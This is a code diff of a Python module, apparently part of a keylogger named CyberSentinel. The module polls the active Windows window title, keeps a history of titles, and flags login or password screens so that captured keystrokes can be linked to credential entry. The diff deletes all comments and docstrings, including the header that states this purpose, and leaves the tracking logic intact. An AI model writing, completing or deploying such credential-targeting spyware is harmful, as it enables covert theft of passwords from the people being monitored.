@@ -1,25 +1,9 @@
-"""
-CyberSentinel - Active Window Tracker
-========================================
-Tracks the currently focused window/application
-so keystrokes can be associated with their context
-(e.g., browser login page, terminal, etc.)
-
-Features:
-    - Real-time active window detection
-    - Window title capture
-    - Process name detection
-    - Login/password context detection
-    - Cross-platform support (Windows primary)
-"""
-
 import threading
 import time
 import re
 from datetime import datetime
 from collections import deque
 
-# Windows-specific imports
 try:
     import ctypes
     from ctypes import wintypes
@@ -28,7 +12,6 @@ except ImportError:
     CTYPES_AVAILABLE = False
 
 
-# Keywords that indicate a login/password context
 LOGIN_KEYWORDS = [
     "log in", "login", "sign in", "signin", "sign-in",
     "password", "passwd", "credentials", "authenticate",
@@ -46,10 +29,6 @@ LOGIN_KEYWORDS = [
 
 
 class WindowTracker:
-    """
-    Tracks the active (foreground) window to provide
-    context for captured keystrokes.
-    """
 
     def __init__(self):
         self._running = False
@@ -60,20 +39,16 @@ class WindowTracker:
         self._window_history = deque(maxlen=100)
         self._lock = threading.Lock()
 
-        # Callbacks
         self._on_window_change = None
         self._on_login_detected = None
 
     def set_window_change_callback(self, callback):
-        """Set callback for window change events."""
         self._on_window_change = callback
 
     def set_login_detected_callback(self, callback):
-        """Set callback when login context is detected."""
         self._on_login_detected = callback
 
     def start(self):
-        """Start tracking the active window."""
         if self._running:
             return
         self._running = True
@@ -85,13 +60,11 @@ class WindowTracker:
         self._thread.start()
 
     def stop(self):
-        """Stop tracking."""
         self._running = False
         if self._thread and self._thread.is_alive():
             self._thread.join(timeout=3)
 
     def _track_loop(self):
-        """Main tracking loop — polls active window."""
         while self._running:
             try:
                 new_title = self._get_active_window_title()
@@ -101,14 +74,12 @@ class WindowTracker:
                         self._current_window = new_title
                         self._is_login_context = self._detect_login_context(new_title)
 
-                    # Record in history
                     self._window_history.append({
                         "title": new_title,
                         "timestamp": datetime.now().isoformat(),
                         "is_login": self._is_login_context,
                     })
 
-                    # Fire callbacks
                     if self._on_window_change:
                         try:
                             self._on_window_change(old_window, new_title)
@@ -124,11 +95,10 @@ class WindowTracker:
             except Exception:
                 pass
 
-            time.sleep(0.3)  # Poll every 300ms
+            time.sleep(0.3)
 
     @staticmethod
     def _get_active_window_title() -> str:
-        """Get the title of the currently active window."""
         if not CTYPES_AVAILABLE:
             return "Unknown Window"
 
@@ -145,7 +115,6 @@ class WindowTracker:
 
     @staticmethod
     def _detect_login_context(window_title: str) -> bool:
-        """Check if the window title suggests a login/password context."""
         title_lower = window_title.lower()
         return any(keyword in title_lower for keyword in LOGIN_KEYWORDS)
 
@@ -160,7 +129,6 @@ class WindowTracker:
             return self._is_login_context
 
     def get_window_history(self, count: int = 20) -> list:
-        """Get recent window history."""
         return list(self._window_history)[-count:]
 
     def get_stats(self) -> dict:
